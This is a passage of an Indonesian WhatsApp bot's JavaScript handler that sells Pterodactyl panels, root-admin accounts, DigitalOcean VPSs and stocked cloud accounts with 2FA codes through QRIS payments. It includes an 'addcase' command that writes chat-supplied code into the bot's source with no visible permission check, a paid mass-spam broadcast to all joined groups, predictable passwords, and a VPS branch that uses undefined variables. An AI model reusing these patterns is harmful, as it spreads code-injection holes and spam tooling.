    let msgQr = await sock.sendMessage(m.chat, {
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: true
  },
})

    sock[m.sender] = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: get.data.result.idtransaksi,
      amount: get.data.result.jumlah.toString(),
      status: true,
      exp: setTimeout(async () => {
        if (sock[m.sender] && sock[m.sender].status) {
          await sock.sendMessage(sock[m.sender].chat, { text: "QRIS Pembayaran Telah Expired." }, { quoted: sock[m.sender].msg });
          await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key })
          delete sock[m.sender];
        }
      }, 250000)
    };
    

    while (sock[m.sender] && sock[m.sender].status && sock[m.sender].amount) {
      await func.sleep(5000);
      const resultcek = await axios.get(
        `https://restapi.simplebot.my.id/orderkuota/cekstatus?apikey=${global.ApikeyRestApi}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`
      );
      const req = resultcek.data;

      if (sock[m.sender] && req?.result?.amount == sock[m.sender].amount) {
        sock[m.sender].status = false;
        clearTimeout(sock[m.sender].exp);

        await sock.sendMessage(sock[m.sender].chat, {
          text: `
*PEMBAYARAN BERHASIL ✅*

 *• ID :* ${sock[m.sender].idDeposit}
 *• Total Pembayaran :* Rp${await func.toRupiah(sock[m.sender].amount)}
 *• Barang :* Panel Pterodactyl
`,
        }, { quoted: sock[m.sender].msg });

        let username = Obj.username
        let email = username + "@gmail.com";
        let name = func.capital(username) + " Server";
        let password = username + "001"
        let f = await fetch(domain + "/api/application/users", {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: "Bearer " + apikey,
          },
          body: JSON.stringify({
            email: email,
            username: username.toLowerCase(),
            first_name: name,
            last_name: "Server",
            language: "en",
            password: password.toString(),
          }),
        });
        let data = await f.json();
        if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
        let user = data.attributes;
        let desc = func.tanggal(Date.now());
        let usr_id = user.id;
        let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
          method: "GET",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: "Bearer " + apikey,
          },
        });
        let data2 = await f1.json();
        let startup_cmd = data2.attributes.startup;
        let f2 = await fetch(domain + "/api/application/servers", {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: "Bearer " + apikey,
          },
          body: JSON.stringify({
            name: name,
            description: desc,
            user: usr_id,
            egg: parseInt(egg),
            docker_image: "ghcr.io/parkervcp/yolks:nodejs_20",
            startup: startup_cmd,
            environment: {
              INST: "npm",
              USER_UPLOAD: "0",
              AUTO_UPDATE: "0",
              CMD_RUN: "npm start",
            },
            limits: {
              memory: Obj.ram,
              swap: 0,
              disk: Obj.disk,
              io: 500,
              cpu: Obj.cpu,
            },
            feature_limits: {
              databases: 5,
              backups: 5,
              allocations: 5,
            },
            deploy: {
              locations: [parseInt(loc)],
              dedicated_ip: false,
              port_range: [],
            },
          }),
        });
        let result = await f2.json();
        if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2));
        let server = result.attributes;
        var orang = sock[m.sender].chat;
        var tekspanel = `
*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})*
*👤 Username :* ${user.username}
*🔐 Password :* ${password}
*🗓️ Created :* ${user.created_at.split("T")[0]}

*🌐 Spesifikasi Server*
* Ram : *${Obj.ram == "0" ? "Unlimited" : Obj.ram.split("").length > 4 ? Obj.ram.split("").slice(0, 2).join("") + "GB" : Obj.ram.charAt(0) + "GB"}*
* Disk : *${Obj.disk == "0" ? "Unlimited" : Obj.disk.split("").length > 4 ? Obj.disk.split("").slice(0, 2).join("") + "GB" : Obj.disk.charAt(0) + "GB"}*
* CPU : *${Obj.cpu == "0" ? "Unlimited" : Obj.cpu + "%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`;

        await sock.sendMessage(
          orang,
          {
            text: tekspanel,
            contextInfo: {
            isForwarded: true
            }
          },
          { quoted: null }
        );
        await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key });

        delete sock[m.sender];
      }
    }
  } catch (err) {
    console.error("Terjadi kesalahan:", err);
 }
 }
break

case "buyadp": case "buyadminpanel": {
  if (m.isGroup)
    return m.reply(
      "Pembelian admin panel Pterodactyl hanya bisa di dalam private chat."
    );
  if (sock[m.sender])
return m.reply(
`Masih ada transaksi yang belum diselesaikan.
      
ketik *.batalbeli* untuk membatalkan transaksi sebelumnya`
);
if (!text) return example("username")
if (args.length > 1) return m.reply("Username dilarang menggunakan spasi.")
  let Obj = {}
  Obj.harga = 20000 //harga
  Obj.username = text.toLowerCase()

  const amount = Number(Obj.harga) + func.generateRandomNumber(110, 250);

  try {
    const get = await axios.get(
      `https://restapi.simplebot.my.id/orderkuota/createpayment?apikey=${global.ApikeyRestApi}&amount=${amount}&codeqr=${global.QrisOrderKuota}`
    );

    const teks3 = `
 *── INFORMASI PEMBAYARAN ──*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await func.toRupiah(get.data.result.jumlah)}
 *• Barang :* Admin Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
_Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!_
`

    let msgQr = await sock.sendMessage(m.chat, {
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: true
  },
})

    sock[m.sender] = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: get.data.result.idtransaksi,
      amount: get.data.result.jumlah.toString(),
      status: true,
      exp: setTimeout(async () => {
        if (sock[m.sender] && sock[m.sender].status) {
          await sock.sendMessage(sock[m.sender].chat, { text: "QRIS Pembayaran Telah Expired." }, { quoted: sock[m.sender].msg });
          await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key })
          delete sock[m.sender];
        }
      }, 250000)
    };
    

    while (sock[m.sender] && sock[m.sender].status && sock[m.sender].amount) {
      await func.sleep(5000);
      const resultcek = await axios.get(
        `https://restapi.simplebot.my.id/orderkuota/cekstatus?apikey=${global.ApikeyRestApi}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`
      );
      const req = resultcek.data;

      if (sock[m.sender] && req?.result?.amount == sock[m.sender].amount) {
        sock[m.sender].status = false;
        clearTimeout(sock[m.sender].exp);

        await sock.sendMessage(sock[m.sender].chat, {
          text: `
*PEMBAYARAN BERHASIL ✅*

 *• ID :* ${sock[m.sender].idDeposit}
 *• Total Pembayaran :* Rp${await func.toRupiah(sock[m.sender].amount)}
 *• Barang :* Admin Panel Pterodactyl
`,
        }, { quoted: sock[m.sender].msg });
let username = Obj.username
let email = username+"@gmail.com"
let name = func.capital(args[0])
let password = username+"001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang = sock[m.sender].chat
var teks = `
*Berikut Detail Akun Admin Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
*🗓️ ${func.tanggal(Date.now())}*

*🌐* ${global.domain}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`

        await sock.sendMessage(
          orang,
          {
            text: teks,
            contextInfo: {
            isForwarded: true
            }
          },
          { quoted: null }
        );
        await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key });
        delete sock[m.sender]
      }
    }
  } catch (err) {
    console.error("Terjadi kesalahan:", err);
 }
 }
break

case "buyreseller": case "buyresellerpanel": {
if (global.linkgrupresellerpanel.length == 0) return m.reply("Maaf grup reseller panel tidak sedang tidak tersedia")
  if (m.isGroup)
    return m.reply(
      "Pembelian Reseller Panel Pterodactyl hanya bisa di dalam private chat."
    );
  if (sock[m.sender])
return m.reply(
`Masih ada transaksi yang belum diselesaikan.
      
ketik *.batalbeli* untuk membatalkan transaksi sebelumnya`
);
  let Obj = {}
  Obj.harga = 20000 // harga

  const amount = Number(Obj.harga) + func.generateRandomNumber(110, 250);

  try {
    const get = await axios.get(
      `https://restapi.simplebot.my.id/orderkuota/createpayment?apikey=${global.ApikeyRestApi}&amount=${amount}&codeqr=${global.QrisOrderKuota}`
    );

    const teks3 = `
 *── INFORMASI PEMBAYARAN ──*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await func.toRupiah(get.data.result.jumlah)}
 *• Barang :* Reseller Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
_Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!_
`

    let msgQr = await sock.sendMessage(m.chat, {
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: true
  },
})

    sock[m.sender] = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: get.data.result.idtransaksi,
      amount: get.data.result.jumlah.toString(),
      status: true,
      exp: setTimeout(async () => {
        if (sock[m.sender] && sock[m.sender].status) {
          await sock.sendMessage(sock[m.sender].chat, { text: "QRIS Pembayaran Telah Expired." }, { quoted: sock[m.sender].msg });
          await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key })
          delete sock[m.sender];
        }
      }, 250000)
    };
    

    while (sock[m.sender] && sock[m.sender].status && sock[m.sender].amount) {
      await func.sleep(5000);
      const resultcek = await axios.get(
        `https://restapi.simplebot.my.id/orderkuota/cekstatus?apikey=${global.ApikeyRestApi}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`
      );
      const req = resultcek.data;

      if (sock[m.sender] && req?.result?.amount == sock[m.sender].amount) {
        sock[m.sender].status = false;
        clearTimeout(sock[m.sender].exp);

        await sock.sendMessage(sock[m.sender].chat, {
          text: `
*PEMBAYARAN BERHASIL ✅*

 *• ID :* ${sock[m.sender].idDeposit}
 *• Total Pembayaran :* Rp${await func.toRupiah(sock[m.sender].amount)}
 *• Barang :* Reseller Panel Pterodactyl
`,
        }, { quoted: sock[m.sender].msg });
       
 
let teks = `
*Join Grup Reseller Panel :*
`
teks += `* ${global.linkgrupresellerpanel}\n`


        await sock.sendMessage(
          sock[m.sender].chat,
          {
            text: teks,
            contextInfo: {
            isForwarded: true
            }
          },
          { quoted: null }
        );
        await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key });
        delete sock[m.sender]
      }
    }
  } catch (err) {
    console.error("Terjadi kesalahan:", err);
 }
 }
break

case "addcase": {
    if (!text) return sock.sendMessage(m.chat, { text: `Contoh: ${prefix}addcase case nya` });

    const fs = require('fs');
    const path = require('path');
    const namaFile = path.join(__dirname, 'skyzo.js');
    const caseBaru = `${text}\n\n`;

    const tambahCase = (data, caseBaru) => {
        const posisiDefault = data.lastIndexOf("default:");
        if (posisiDefault !== -1) {
            const kodeBaruLengkap = data.slice(0, posisiDefault) + caseBaru + data.slice(posisiDefault);
            return { success: true, kodeBaruLengkap };
        } else {
            return { success: false, message: "Tidak dapat menemukan case default di dalam file!" };
        }
    };

    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err);
            return sock.sendMessage(m.chat, { text: `Terjadi kesalahan saat membaca file: ${err.message}` });
        }

        const result = tambahCase(data, caseBaru);
        if (result.success) {
            fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
                if (err) {
                    console.error('Terjadi kesalahan saat menulis file:', err);
                    return sock.sendMessage(m.chat, { text: `Terjadi kesalahan saat menulis file: ${err.message}` });
                } else {
                    console.log('Sukses menambahkan case baru:');
                    console.log(caseBaru);
                    return sock.sendMessage(m.chat, { text: 'Sukses menambahkan case!' });
                }
            });
        } else {
            console.error(result.message);
            return sock.sendMessage(m.chat, { text: result.message });
        }
    });
}
break

case "buyjasajpm": case "buyjasashare": {
  if (m.isGroup)
    return m.reply(
      "Pembelian Jasa Jpm hanya bisa di dalam private chat."
    );
  if (sock[m.sender])
return m.reply(
`Masih ada transaksi yang belum diselesaikan.
      
ketik *.batalbeli* untuk membatalkan transaksi sebelumnya`
);
const groups = await sock.groupFetchAllParticipating()
if (!text) return m.reply(`Contoh : *${cmd}* pesannya & bisa dengan foto juga\n\nTotal grup : ${(Object.keys(groups)).length}`)
  let Obj = {}
if (/image/i.test(mime)) {
Obj.image = m.quoted ? await m.quoted.download() : await m.download()
}
  Obj.teksjpm = text
  Obj.grup = await Object.keys(groups)
  Obj.harga = 1 // harga

  const amount = Number(Obj.harga) + func.generateRandomNumber(110, 250);

  try {
    const get = await axios.get(
      `https://restapi.simplebot.my.id/orderkuota/createpayment?apikey=${global.ApikeyRestApi}&amount=${amount}&codeqr=${global.QrisOrderKuota}`
    );

    const teks3 = `
 *── INFORMASI PEMBAYARAN ──*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await func.toRupiah(get.data.result.jumlah)}
 *• Barang :* Jasa Jpm
 *• Target :* ${Obj.grup.length} Grup
 *• Expired :* 5 menit

*Note :* 
_Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!_
`

    let msgQr = await sock.sendMessage(m.chat, {
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: true
  },
})

    sock[m.sender] = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: get.data.result.idtransaksi,
      amount: get.data.result.jumlah.toString(),
      status: true,
      exp: setTimeout(async () => {
        if (sock[m.sender] && sock[m.sender].status) {
          await sock.sendMessage(sock[m.sender].chat, { text: "QRIS Pembayaran Telah Expired." }, { quoted: sock[m.sender].msg });
          await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key })
          delete sock[m.sender];
        }
      }, 250000)
    };
    

    while (sock[m.sender] && sock[m.sender].status && sock[m.sender].amount) {
      await func.sleep(5000);
      const resultcek = await axios.get(
        `https://restapi.simplebot.my.id/orderkuota/cekstatus?apikey=${global.ApikeyRestApi}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`
      );
      const req = resultcek.data;

      if (sock[m.sender] && req?.result?.amount == sock[m.sender].amount) {
        sock[m.sender].status = false;
        clearTimeout(sock[m.sender].exp);

        await sock.sendMessage(sock[m.sender].chat, {
          text: `
*PEMBAYARAN BERHASIL ✅*

 *• ID :* ${sock[m.sender].idDeposit}
 *• Total Pembayaran :* Rp${await func.toRupiah(sock[m.sender].amount)}
 *• Barang :* Jasa Jpm
 *• Target : ${Obj.grup.length} Grup
`,
        }, { quoted: sock[m.sender].msg });

await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key });
const gcnya = Obj.grup
await sock.sendMessage(sock[m.sender].chat,
{text: `Memproses Jpm pesan *${Obj.image !== undefined ? "teks & foto" : "teks"}* ke ${gcnya.length} grup`, contextInfo: {isForwarded: true}}, { quoted: null });
let messages = Obj.image !== undefined ? { image: Obj.image, caption: Obj.teksjpm } : { text: Obj.teksjpm }
for (let id of gcnya) {
if (bljpm.includes(id)) continue
try {
await sock.sendMessage(id, messages, { quoted: qjasajpm })
await func.sleep(4000)
} catch {}
}
await sock.sendMessage(sock[m.sender].chat,
{text: `Berhasil Jpm pesan *${Obj.image !== undefined ? "teks & foto" : "teks"}* ke ${gcnya.length} grup`, contextInfo: {isForwarded: true}}, { quoted: null })
delete sock[m.sender]
      }
    }
  } catch (err) {
    console.error("Terjadi kesalahan:", err);
 }
 }
break


case "buyvps": {
if (global.apidigitalocean.length < 1) return m.reply("Maaf vps sedang tidak tersedia.")
  if (m.isGroup)
    return m.reply(
      "Pembelian Reseller Panel Pterodactyl hanya bisa di dalam private chat."
    );
  if (sock[m.sender])
return m.reply(
`Masih ada transaksi yang belum diselesaikan.
      
ketik *.batalbeli* untuk membatalkan transaksi sebelumnya`
);

if (args.length < 4) return sock.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Vps',
                sections: [
                  {
                    rows: [
                {
                    header: "RAM 1GB & 1 CPU ✅",
                    title: "Sgp Ubuntu 20.04",
                    description: "Rp20.000",
                    id: ".buyvps vps1g1c ubuntu 20-04 sgp1 20000"
                },
                {
                    header: "RAM 2GB & 1 CPU ✅",
                    title: "Sgp Ubuntu 20.04",
                    description: "Rp25.000",
                    id: ".buyvps vps2g1c ubuntu 20-04 sgp1 25000"
                },
                {
                    header: "RAM 2GB & 2 CPU ✅",
                    title: "Sgp Ubuntu 20.04",
                    description: "Rp30.000",
                    id: ".buyvps vps2g2c ubuntu 20-04 sgp1 30000"
                },
                {
                    header: "RAM 4GB & 2 CPU ✅",
                    title: "Sgp Ubuntu 20.04",
                    description: "Rp35.000",
                    id: ".buyvps vps4g2c ubuntu 20-04 sgp1 35000"
                },
                {
                    header: "RAM 8GB & 4 CPU ✅",
                    title: "Sgp Ubuntu 20.04",
                    description: "Rp50.000",
                    id: ".buyvps vps8g4c ubuntu 20-04 sgp1 50000"
                },
                {
                    header: "RAM 16GB & 4 CPU ✅",
                    title: "Sgp Ubuntu 20.04",
                    description: "Rp60.000",
                    id: `.buyvps vps16g4c ubuntu 20-04 sgp1 60000`
                }
            ]
                  },
                ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: "\n Pilih Spesifikasi Vps 🛍️\n",
  contextInfo: {
   isForwarded: true
  },
}, {quoted: null})

let Obj = {}
Obj.hostname = `skyzopedia${func.generateRandomNumber(1, 10)}` // Nama host
Obj.sizeOption = args[0]; // Ukuran VPS
Obj.osOption = args[1] || "ubuntu"; // Default: Ubuntu
Obj.osVersionOption = args[2] || "20-04"; // Default: Ubuntu 20.04
Obj.regionOption = args[3] || "sgp1"; // Default: Singapore
Obj.harga = args[4]
const passwd = crypto.randomBytes(10).toString("base64").replace(/[^a-zA-Z0-9]/g, "").slice(0, 10);
Obj.password = passwd

  const amount = Number(Obj.harga) + func.generateRandomNumber(110, 250);

  try {
    const get = await axios.get(
      `https://restapi.simplebot.my.id/orderkuota/createpayment?apikey=${global.ApikeyRestApi}&amount=${amount}&codeqr=${global.QrisOrderKuota}`
    );

    const teks3 = `
 *── INFORMASI PEMBAYARAN ──*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await func.toRupiah(get.data.result.jumlah)}
 *• Barang :* Virtual Private Server (Vps)
 *• Expired :* 5 menit

*Note :* 
_Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!_
`

    let msgQr = await sock.sendMessage(m.chat, {
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: true
  },
})

    sock[m.sender] = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: get.data.result.idtransaksi,
      amount: get.data.result.jumlah.toString(),
      status: true,
      exp: setTimeout(async () => {
        if (sock[m.sender] && sock[m.sender].status) {
          await sock.sendMessage(sock[m.sender].chat, { text: "QRIS Pembayaran Telah Expired." }, { quoted: sock[m.sender].msg });
          await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key })
          delete sock[m.sender];
        }
      }, 250000)
    };
    

    while (sock[m.sender] && sock[m.sender].status && sock[m.sender].amount) {
      await func.sleep(5000);
      const resultcek = await axios.get(
        `https://restapi.simplebot.my.id/orderkuota/cekstatus?apikey=${global.ApikeyRestApi}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`
      );
      const req = resultcek.data;

      if (sock[m.sender] && req?.result?.amount == sock[m.sender].amount) {
        sock[m.sender].status = false;
        clearTimeout(sock[m.sender].exp);

        await sock.sendMessage(sock[m.sender].chat, {
          text: `
*PEMBAYARAN BERHASIL ✅*

 *• ID :* ${sock[m.sender].idDeposit}
 *• Total Pembayaran :* Rp${await func.toRupiah(sock[m.sender].amount)}
 *• Barang :* Virtual Private Server (Vps)
`,
        }, { quoted: sock[m.sender].msg });

  // Peta OS dan Versi
  const osMap = {
    ubuntu: { '20-04': 'ubuntu-20-04-x64', '22-04': 'ubuntu-22-04-x64' },
    debian: { '10': 'debian-10-x64', '11': 'debian-11-x64' },
    centos: { '8': 'centos-8-x64', '7': 'centos-7-x64' },
    fedora: { '34': 'fedora-34-x64', '35': 'fedora-35-x64' },
  };

  if (!osMap[osOption]) {
    return m.reply(`*OS tidak valid!*\nOS yang tersedia: ubuntu, debian, centos, fedora.`);
  }
  if (!osMap[osOption][osVersionOption]) {
    return m.reply(
      `*Versi OS tidak valid!*\nVersi yang tersedia untuk ${osOption}: ${Object.keys(osMap[osOption]).join(', ')}`
    );
  }

  // Peta Ukuran
  const sizeMap = {
    vps1g1c: 's-1vcpu-1gb',
    vps2g1c: 's-1vcpu-2gb',
    vps2g2c: 's-2vcpu-2gb',
    vps4g2c: 's-2vcpu-4gb',
    vps8g4c: 's-4vcpu-8gb',
    vps16g4c: 's-4vcpu-16gb-amd',
  };

  if (!sizeMap[sizeOption]) {
    return m.reply(`*Ukuran VPS tidak valid!*\nUkuran yang tersedia: ${Object.keys(sizeMap).join(', ')}`);
  }

  // Peta Region
  const regionMap = {
    sgp1: 'Singapore (SGP1)',
    nyc3: 'New York (NYC3)',
    ams3: 'Amsterdam (AMS3)',
    lon1: 'London (LON1)',
    fra1: 'Frankfurt (FRA1)',
    sfo1: 'San Francisco (SFO1)',
    blr1: 'Bangalore (BLR1)',
    tor1: 'Toronto (TOR1)',
  };

  if (!regionMap[regionOption]) {
    return m.reply(`*Region tidak valid!*\nRegion yang tersedia: ${Object.keys(regionMap).join(', ')}`);
  }

  try {
    // Data untuk membuat droplet
    let dropletData = {
      name: hostname.toLowerCase(),
      region: regionOption,
      size: sizeMap[sizeOption],
      image: osMap[osOption][osVersionOption],
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T'],
    };
    let password = Obj.password
    dropletData.user_data = `#cloud-config\npassword: ${password}\nchpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: 'Bearer ' + global.apidigitalocean,
      },
      body: JSON.stringify(dropletData),
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          Authorization: 'Bearer ' + global.apidigitalocean,
        },
      });

      let dropletDetails = await dropletResponse.json();
      let ipVPS =
        dropletDetails.droplet.networks.v4 && dropletDetails.droplet.networks.v4.length > 0
          ? dropletDetails.droplet.networks.v4[0].ip_address
          : 'Tidak ada alamat IP yang tersedia';

 let messageText = `
*Berhasil membuat Vps ✅*
      
* *ID :* ${dropletId}
* *IP Vps :* ${ipVPS}
* *Username :* root
* *Password :* ${password}
`

      await sock.sendMessage(
          sock[m.sender].chat,
          {
            text: messageText,
            contextInfo: {
            isForwarded: true
            }
          },
          { quoted: null }
        );
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
    
        await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key });
        delete sock[m.sender]
  } catch (err) {
    console.error(err);
    m.reply(`Terjadi kesalahan saat membuat VPS: ${err.message}`);
  }
      }
    }
  } catch (err) {
    console.error("Terjadi kesalahan:", err);
 }
 }
break


case "buydo": case "buydigitalocean": {
if (stokdo.length < 1) return m.reply("Maaf stok akun Digital Ocean sedang tidak tersedia.")
  if (m.isGroup)
    return m.reply(
      "Pembelian Digital Ocean hanya bisa di dalam private chat."
    );
  if (sock[m.sender])
return m.reply(
`Masih ada transaksi yang belum diselesaikan.
      
ketik *.batalbeli* untuk membatalkan transaksi sebelumnya`
);

  if (!text) {
    let butnya = []
    let urutt = 0
    for (let gg of stokdo) {
    butnya.push({
    title: `${gg.droplet} Droplet ✅`, 
    description: `Rp${await func.toRupiah(gg.harga)}`, 
    id: `.buydo ${urutt += 1}`
    })
    }
    return sock.sendMessage(
      m.chat,
      {
        buttons: [
          {
            buttonId: "action",
            buttonText: { displayText: "ini pesan interactiveMeta" },
            type: 4,
            nativeFlowInfo: {
              name: "single_select",
              paramsJson: JSON.stringify({
                title: "Pilih Droplet",
                sections: [
                  {
                    highlight_label: "Hight Quality",
                    rows: butnya, 
                    }
                 ], 
              }),
            },
          },
        ],
        headerType: 1,
        viewOnce: true,
        text: "\n *Pilih Droplet Digital Ocean 🛍️*\n",
        contextInfo: {
          isForwarded: true, 
          mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
        },
      },
      { quoted: qpay }
    );
  }
 const donya = stokdo[Number(text) - 1]
let us = crypto.randomBytes(4).toString('hex')
let Obj = {}
Obj.harga = donya.harga
Obj.akun = donya
  const amount = Number(Obj.harga) + func.generateRandomNumber(110, 250);

  try {
    const get = await axios.get(
      `https://restapi.simplebot.my.id/orderkuota/createpayment?apikey=${global.ApikeyRestApi}&amount=${amount}&codeqr=${global.QrisOrderKuota}`
    );

    const teks3 = `
 *── INFORMASI PEMBAYARAN ──*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await func.toRupiah(get.data.result.jumlah)}
 *• Barang :* Akun Digital Ocean
 *• Expired :* 5 menit

*Note :* 
_Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!_
`

    let msgQr = await sock.sendMessage(m.chat, {
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: true
  },
})

    sock[m.sender] = {
      msg: msgQr,
      chat: m.sender,
      idDeposit: get.data.result.idtransaksi,
      amount: get.data.result.jumlah.toString(),
      status: true,
      exp: setTimeout(async () => {
        if (sock[m.sender] && sock[m.sender].status) {
          await sock.sendMessage(sock[m.sender].chat, { text: "QRIS Pembayaran Telah Expired." }, { quoted: sock[m.sender].msg });
          await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key })
          delete sock[m.sender];
        }
      }, 250000)
    };
    

    while (sock[m.sender] && sock[m.sender].status && sock[m.sender].amount) {
      await func.sleep(5000);
      const resultcek = await axios.get(
        `https://restapi.simplebot.my.id/orderkuota/cekstatus?apikey=${global.ApikeyRestApi}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`
      );
      const req = resultcek.data;

      if (sock[m.sender] && req?.result?.amount == sock[m.sender].amount) {
        sock[m.sender].status = false;
        clearTimeout(sock[m.sender].exp);

        await sock.sendMessage(sock[m.sender].chat, {
          text: `
*PEMBAYARAN BERHASIL ✅*

 *• ID :* ${sock[m.sender].idDeposit}
 *• Total Pembayaran :* Rp${await func.toRupiah(sock[m.sender].amount)}
 *• Barang :* Akun Digital Ocean
`,
        }, { quoted: sock[m.sender].msg });

var teks = `
*Data Akun Digitalocean 📦*

*💌 Email :* ${Obj.akun.email}
*🔐 Password :* ${Obj.akun.password}
*Kode 2FA :* ${Obj.akun.kode2fa}
*Droplet :* ${Obj.akun.droplet}

*Syarat & Ketentuan :*
* Simpan data ini sebaik mungkin
* Seller hanya mengirim 1 kali!
* Garansi akun aktif 30 day
`
await sock.sendMessage(sock[m.sender].chat, {text: teks, contextInfo: { isForwarded: true }}, {quoted: null})
const position = stokdo.indexOf(Obj.akun)
stokdo.splice(position, 1)
await fs.writeFileSync("./data/stokdo.json", JSON.stringify(stokdo, null, 2))
        await sock.sendMessage(sock[m.sender].chat, { delete: sock[m.sender].msg.key });

        delete sock[m.sender];
      }
    }
  } catch (err) {
    console.error("Terjadi kesalahan:", err);
 }
 }
break

case "buysc": case "buyscript": {
